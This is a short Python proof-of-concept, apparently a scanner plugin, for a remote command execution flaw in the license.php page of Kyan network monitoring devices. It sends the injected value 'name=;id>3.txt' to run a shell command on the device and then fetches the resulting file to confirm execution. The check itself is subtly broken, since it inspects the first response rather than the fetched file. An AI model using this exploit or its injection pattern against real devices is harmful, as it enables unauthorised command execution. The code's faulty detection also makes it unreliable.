#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Kyan 网络监控设备 license.php 远程命令执行漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  data = 'name=;id>3.txt'
  target = '/license.php'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200:
      res2=requests.get(url=url+'/3.txt',headers=headers,timeout=5,verify=False)
      if "uid" in res.text and 'gid' in res.text and 'groups' in res.text:
        res.close()
        ret['ifbug'] = True
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret